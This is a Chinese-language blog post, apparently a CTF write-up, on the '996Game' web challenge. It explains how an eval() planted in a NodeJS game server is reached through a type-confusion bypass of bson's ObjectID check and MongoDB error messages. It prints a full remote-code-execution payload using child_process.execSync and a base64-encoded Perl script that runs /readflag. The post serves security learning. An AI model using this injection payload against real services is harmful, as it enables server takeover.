@@ -1,0 +1,600 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.1.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon.jpg">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.14.0/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/pace-js@1.0.2/themes/blue/pace-theme-minimal.css">
+  <script src="//cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+
+<script class="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"tiaonmmn.github.io","root":"/","scheme":"Gemini","version":"8.0.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":true,"color":"#b46eba","save":"auto"},"fancybox":true,"mediumzoom":true,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":true,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true}};
+  </script>
+
+  <meta name="description" content="*CTF 2019的996Game。给了个Hint:db.a.find(&amp;#123;&quot;b&quot;:&amp;#123;&quot;$gt&quot;:1,&quot;c&quot;:&quot;d&quot;&amp;#125;&amp;#125;)。 上来就满满的页游画风，目测是某开源网页游戏改的题，果然，翻一下源码，提示我们去找https:&#x2F;&#x2F;github.com&#x2F;Jerenaux&#x2F;phaserquest。发现是个NodeJS项目，把源码脱下来看看。发现直接将js目录暴露出来了。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BUUOJ刷题-Web-996Game">
+<meta property="og:url" content="http://tiaonmmn.github.io/2019/12/01/BUUOJ%E5%88%B7%E9%A2%98-Web-996Game/index.html">
+<meta property="og:site_name" content="Tiaonmmn&#39;s Littile House">
+<meta property="og:description" content="*CTF 2019的996Game。给了个Hint:db.a.find(&amp;#123;&quot;b&quot;:&amp;#123;&quot;$gt&quot;:1,&quot;c&quot;:&quot;d&quot;&amp;#125;&amp;#125;)。 上来就满满的页游画风，目测是某开源网页游戏改的题，果然，翻一下源码，提示我们去找https:&#x2F;&#x2F;github.com&#x2F;Jerenaux&#x2F;phaserquest。发现是个NodeJS项目，把源码脱下来看看。发现直接将js目录暴露出来了。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://tiaonmmn.github.io/2019/12/01/BUUOJ%E5%88%B7%E9%A2%98-Web-996Game/Diffs.png">
+<meta property="og:image" content="http://tiaonmmn.github.io/2019/12/01/BUUOJ%E5%88%B7%E9%A2%98-Web-996Game/localStorage.png">
+<meta property="og:image" content="http://tiaonmmn.github.io/2019/12/01/BUUOJ%E5%88%B7%E9%A2%98-Web-996Game/ServerError.png">
+<meta property="og:image" content="http://tiaonmmn.github.io/2019/12/01/BUUOJ%E5%88%B7%E9%A2%98-Web-996Game/Final-Payload-1.png">
+<meta property="og:image" content="http://tiaonmmn.github.io/2019/12/01/BUUOJ%E5%88%B7%E9%A2%98-Web-996Game/Final-Payload-2.png">
+<meta property="article:published_time" content="2019-12-01T11:13:06.000Z">
+<meta property="article:modified_time" content="2019-12-10T12:15:12.586Z">
+<meta property="article:author" content="Tiaonmmn.ZMZ">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="NodeJS">
+<meta property="article:tag" content="BUUOJ">
+<meta property="article:tag" content="Pipe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://tiaonmmn.github.io/2019/12/01/BUUOJ%E5%88%B7%E9%A2%98-Web-996Game/Diffs.png">
+
+
+<link rel="canonical" href="http://tiaonmmn.github.io/2019/12/01/BUUOJ%E5%88%B7%E9%A2%98-Web-996Game/">
+
+
+<script class="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>BUUOJ刷题-Web-996Game | Tiaonmmn's Littile House</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  body { margin-top: 2rem; }
+
+  .use-motion .menu-item,
+  .use-motion .sidebar,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header {
+    visibility: visible;
+  }
+
+  .use-motion .header,
+  .use-motion .site-brand-container .toggle,
+  .use-motion .footer { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle,
+  .use-motion .custom-logo-image {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line {
+    transform: scaleX(1);
+  }
+
+  .search-pop-overlay, .sidebar-nav { display: none; }
+  .sidebar-panel { display: block; }
+  </style>
+</noscript>
+
+<link rel="stylesheet" href="\assets\css\APlayer.min.css" class="aplayer-style-marker">
+<script src="\assets\js\APlayer.min.js" class="aplayer-script-marker"></script>
+<script src="\assets\js\Meting.min.js" class="meting-script-marker"></script>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">Tiaonmmn's Littile House</h1>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-overview-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <section class="post-toc-wrap sidebar-panel">
+      </section>
+      <!--/noindex-->
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Tiaonmmn.ZMZ"
+      src="/avatar.jpeg">
+  <p class="site-author-name" itemprop="name">Tiaonmmn.ZMZ</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+          <span class="site-state-item-count">67</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+        <span class="site-state-item-count">82</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </section>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+      
+
+      
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://tiaonmmn.github.io/2019/12/01/BUUOJ%E5%88%B7%E9%A2%98-Web-996Game/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/avatar.jpeg">
+      <meta itemprop="name" content="Tiaonmmn.ZMZ">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tiaonmmn's Littile House">
+    </span>
+
+    
+    
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          BUUOJ刷题-Web-996Game
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2019-12-01 19:13:06" itemprop="dateCreated datePublished" datetime="2019-12-01T19:13:06+08:00">2019-12-01</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2019-12-10 20:15:12" itemprop="dateModified" datetime="2019-12-10T20:15:12+08:00">2019-12-10</time>
+      </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Writeups/" itemprop="url" rel="index"><span itemprop="name">Writeups</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2019/12/01/BUUOJ%E5%88%B7%E9%A2%98-Web-996Game/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2019/12/01/BUUOJ%E5%88%B7%E9%A2%98-Web-996Game/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+      </div>
+      <div class="post-meta">
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>5.6k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>5 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p>*CTF 2019的996Game。给了个Hint:<code>db.a.find(&#123;"b":&#123;"$gt":1,"c":"d"&#125;&#125;)</code>。</p>
+<p>上来就满满的页游画风，目测是某开源网页游戏改的题，果然，翻一下源码，提示我们去找https://github.com/Jerenaux/phaserquest。发现是个NodeJS项目，把源码脱下来看看。发现直接将js目录暴露出来了。 <a id="more"></a> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">app.use(<span class="string">&#x27;/css&#x27;</span>,express.static(__dirname + <span class="string">&#x27;/css&#x27;</span>));</span><br><span class="line">app.use(<span class="string">&#x27;/js&#x27;</span>,express.static(__dirname + <span class="string">&#x27;/js&#x27;</span>));</span><br><span class="line">app.use(<span class="string">&#x27;/assets&#x27;</span>,express.static(__dirname + <span class="string">&#x27;/assets&#x27;</span>));</span><br></pre></td></tr></table></figure> js/server即为服务端的代码，合理猜测出题人修改了这里。我们把服务器上的源码脱下来进行比对。 <img src="/2019/12/01/BUUOJ%E5%88%B7%E9%A2%98-Web-996Game/Diffs.png" class="" title="GameServer.js的差别"> 多了个eval()，事情就有点大了。</p>
+<p>GameServer.server来源于server.js中的声明，<code>var server=require('http').Server(app);</code>和<code>gs.server=server;</code>。而db来自mongodb。也就是说我们需要让findOne操作失败，并且控制返回信息。我们可控的是什么？loadPlayer函数参数一个是socket，一个是id。在server.js中loadPlayer函数在io.on()函数执行时被调用，用的是socket.io库，采用WebSocket协议进行通讯，那么id应该可控。</p>
+<p>我们具体跟一下代码，在client下的client.js中发现，客户端会将相关参数保存到浏览器的localStorage里。 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Client.socket.on(<span class="string">&#x27;pid&#x27;</span>,<span class="function"><span class="keyword">function</span>(<span class="params">playerID</span>)</span>&#123; <span class="comment">// the &#x27;pid&#x27; event is used for the server to tell the client what is the ID of the player</span></span><br><span class="line">    Client.setLocalData(playerID);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure> <img src="/2019/12/01/BUUOJ%E5%88%B7%E9%A2%98-Web-996Game/localStorage.png" class="" title="浏览器的localStorage"> 那么我们手动修改playerID会怎样？Firefox修改localStorage里的playerID后重刷新页面，Play后发现游戏死在了Creating World阶段，肯定是报错了，但是报错点在哪里？这个光看源码是不够的了，原repo给出了Dockerfile，我们搭起来环境看看。 <img src="/2019/12/01/BUUOJ%E5%88%B7%E9%A2%98-Web-996Game/ServerError.png" class="" title="服务器报错"> 注意报错点是在bson/lib/objectid.js里的new ObjectID()里。要求我们的playerID是24位字符，随便修改一个合法的playerID进入游戏。我们来看一下objectid.js里面有什么内容。涉及到的new ObjectID代码如下： <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ObjectID = <span class="function"><span class="keyword">function</span> <span class="title">ObjectID</span>(<span class="params">id</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// Duck-typing to support ObjectId from different npm packages</span></span><br><span class="line">  <span class="keyword">if</span> (id <span class="keyword">instanceof</span> ObjectID) <span class="keyword">return</span> id;</span><br><span class="line">  <span class="keyword">if</span> (!(<span class="built_in">this</span> <span class="keyword">instanceof</span> ObjectID)) <span class="keyword">return</span> <span class="keyword">new</span> ObjectID(id);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">this</span>._bsontype = <span class="string">&#x27;ObjectID&#x27;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// The most common usecase (blank id, new objectId instance)</span></span><br><span class="line">  <span class="keyword">if</span> (id == <span class="literal">null</span> || <span class="keyword">typeof</span> id === <span class="string">&#x27;number&#x27;</span>) &#123;</span><br><span class="line">    <span class="comment">// Generate a new id</span></span><br><span class="line">    <span class="built_in">this</span>.id = <span class="built_in">this</span>.generate(id);</span><br><span class="line">    <span class="comment">// If we are caching the hex string</span></span><br><span class="line">    <span class="keyword">if</span> (ObjectID.cacheHexString) <span class="built_in">this</span>.__id = <span class="built_in">this</span>.toString(<span class="string">&#x27;hex&#x27;</span>);</span><br><span class="line">    <span class="comment">// Return the object</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Check if the passed in id is valid</span></span><br><span class="line">  <span class="keyword">var</span> valid = ObjectID.isValid(id);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Throw an error if it&#x27;s not a valid setup</span></span><br><span class="line">  <span class="keyword">if</span> (!valid &amp;&amp; id != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(</span><br><span class="line">      <span class="string">&#x27;Argument passed in must be a single String of 12 bytes or a string of 24 hex characters&#x27;</span></span><br><span class="line">    );</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (valid &amp;&amp; <span class="keyword">typeof</span> id === <span class="string">&#x27;string&#x27;</span> &amp;&amp; id.length === <span class="number">24</span> &amp;&amp; hasBufferType) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> ObjectID(<span class="keyword">new</span> Buffer(id, <span class="string">&#x27;hex&#x27;</span>));</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (valid &amp;&amp; <span class="keyword">typeof</span> id === <span class="string">&#x27;string&#x27;</span> &amp;&amp; id.length === <span class="number">24</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> ObjectID.createFromHexString(id);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (id != <span class="literal">null</span> &amp;&amp; id.length === <span class="number">12</span>) &#123;</span><br><span class="line">    <span class="comment">// assume 12 byte string</span></span><br><span class="line">    <span class="built_in">this</span>.id = id;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (id != <span class="literal">null</span> &amp;&amp; id.toHexString) &#123;</span><br><span class="line">    <span class="comment">// Duck-typing to support ObjectId from different npm packages</span></span><br><span class="line">    <span class="keyword">return</span> id;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(</span><br><span class="line">      <span class="string">&#x27;Argument passed in must be a single String of 12 bytes or a string of 24 hex characters&#x27;</span></span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ObjectID.cacheHexString) <span class="built_in">this</span>.__id = <span class="built_in">this</span>.toString(<span class="string">&#x27;hex&#x27;</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure> 我们的报错是因为没有通过isValid()的检查，isValid()代码如下： <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">ObjectID.isValid = <span class="function"><span class="keyword">function</span> <span class="title">isValid</span>(<span class="params">id</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (id == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> id === <span class="string">&#x27;number&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> id === <span class="string">&#x27;string&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> id.length === <span class="number">12</span> || (id.length === <span class="number">24</span> &amp;&amp; checkForHexRegExp.test(id));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (id <span class="keyword">instanceof</span> ObjectID) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (id <span class="keyword">instanceof</span> _Buffer) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Duck-Typing detection of ObjectId like objects</span></span><br><span class="line">  <span class="keyword">if</span> (id.toHexString) &#123;</span><br><span class="line">    <span class="keyword">return</span> id.id.length === <span class="number">12</span> || (id.id.length === <span class="number">24</span> &amp;&amp; checkForHexRegExp.test(id.id));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure> 用的typeof，如果是Stirng，判断id.length是否等于12。JavaScript是种弱类型语言，原本代码认为提交的id是String对象而直接用length属性获得长度，如果我们构造一个对象，包含length==12的属性呢？Payload为<code>id=&#123;"id":&#123;"length":12&#125;&#125;</code>。这样就绕过isValid()的检查了，回到ObjectID构造函数，然后它会检查id本身是什么类型，目前我们的id已经是Object了，看下面两个else if： <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (id != <span class="literal">null</span> &amp;&amp; id.length === <span class="number">12</span>) &#123;</span><br><span class="line">    <span class="comment">// assume 12 byte string</span></span><br><span class="line">    <span class="built_in">this</span>.id = id;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (id != <span class="literal">null</span> &amp;&amp; id.toHexString) &#123;</span><br><span class="line">    <span class="comment">// Duck-typing to support ObjectId from different npm packages</span></span><br><span class="line">    <span class="keyword">return</span> id;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(</span><br><span class="line">      <span class="string">&#x27;Argument passed in must be a single String of 12 bytes or a string of 24 hex characters&#x27;</span></span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ObjectID.cacheHexString) <span class="built_in">this</span>.__id = <span class="built_in">this</span>.toString(<span class="string">&#x27;hex&#x27;</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure> 如果id!=null并且id.length===12则this.id=id，但我们不能走这个判断，因为最后一行会把我们的Payload转成Hex。那么Payload变为<code>id=&#123;"length":"0","id":&#123;"length":12&#125;&#125;</code>，下一个if要求id.toHexString为真，那么Payload变为：<code>id=&#123;"length":"0","toHexString":true,"id":&#123;"length":12&#125;&#125;</code>。这样就可以绕过检测了。</p>
+<p>我们可控id了，下一步是要控制报错信息。我们的Hint目前还没用上，后端数据库用的是MongoDB。在MongoDB里执行一下Hint试试。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">MongoDB shell version: 2.6.10</span><br><span class="line">connecting to: test</span><br><span class="line">&gt; db.a.find(&#123;&quot;b&quot;:&#123;&quot;$gt&quot;:1,&quot;c&quot;:&quot;d&quot;&#125;&#125;)</span><br><span class="line">error: &#123;</span><br><span class="line">	&quot;$err&quot; : &quot;Can&#39;t canonicalize query: BadValue unknown operator: c&quot;,</span><br><span class="line">	&quot;code&quot; : 17287</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>$gt在MongoDB是&gt;的意思，是个内置运算符。如果内置运算符放在最前面，后面的内容就会报错，key会显示出来。下面就是传NodeJS的Payload了，用require('child_process').execSync即可。然后有个问题，又来/readflag绕过，用Perl的IPC:Open3来进行管道交互，最终拿到flag。</p>
+<p>最终Payload:Client.getPlayerID =  () => ({ "$gt":1,[`process.chdir('/');socket.emit('aaa');socket.emit(require('child_process').execSync('sh -c \"echo \\\'dXNlIHN0cmljdDsKdXNlIElQQzo6T3BlbjM7CgpteSAkcGlkID0gb3BlbjMoXCpDSExEX0lOLCBcKkNITERfT1VULCBcKkNITERfRVJSLCAnL3JlYWRmbGFnJykgb3IgZGllICJvcGVuMygpIGZhaWxlZCAkISI7CgpteSAkcjsKCiRyID0gPENITERfT1VUPjsKcHJpbnQgIiRyIjsKJHIgPSA8Q0hMRF9PVVQ+OwpwcmludCAiJHIiOwokcj1ldmFsICIkciI7CnByaW50ICIkclxuIjsKcHJpbnQgQ0hMRF9JTiAiJHJcbiI7CiRyID0gPENITERfT1VUPjsKcHJpbnQgIiRyIjsKJHIgPSA8Q0hMRF9PVVQ+OwpwcmludCAiJHIiOw==\\\'|base64 -d | perl \"'));`]:"bb", toHexString: 'aaa', length: 0, id: {length: 12}})</p>
+<p>为了方便Payload输入 我们用Base64编码然后传递Perl，没用bash的原因是bash并不是总是存在的，但是sh一定有（说的就是你，Alpine Linux）。</p>
+<p>放在控制台里执行，然后点Play触发，就可以在Network的WS里看到结果了。如图所示：</p>
+<img src="/2019/12/01/BUUOJ%E5%88%B7%E9%A2%98-Web-996Game/Final-Payload-1.png" class="" title="Final Payload 1">
+<img src="/2019/12/01/BUUOJ%E5%88%B7%E9%A2%98-Web-996Game/Final-Payload-2.png" class="" title="Final Payload 2">
+<p>P.S. 网上的Payload都没注意引号的转义啊，在控制台里输入Payload的时候要进行单双引号转义，但是传递到NodeJS后原本转义用的<code>\</code>会被去掉，就变成没转义的，实际上要二次转义。</p>
+
+    <div id="aplayer-RcZsWiQj" class="aplayer aplayer-tag-marker meting-tag-marker"
+         data-id="27570832" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="true" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#ad7a86" data-loop="all"
+    ></div>
+<p>flag{ef5059f5-8ee6-4727-aca3-6bd720379070}</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>Tiaonmmn.ZMZ
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="http://tiaonmmn.github.io/2019/12/01/BUUOJ%E5%88%B7%E9%A2%98-Web-996Game/" title="BUUOJ刷题-Web-996Game">http://tiaonmmn.github.io/2019/12/01/BUUOJ刷题-Web-996Game/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nd/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-ND</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/Web/" rel="tag"><i class="fa fa-tag"></i> Web</a>
+              <a href="/tags/NodeJS/" rel="tag"><i class="fa fa-tag"></i> NodeJS</a>
+              <a href="/tags/BUUOJ/" rel="tag"><i class="fa fa-tag"></i> BUUOJ</a>
+              <a href="/tags/Pipe/" rel="tag"><i class="fa fa-tag"></i> Pipe</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
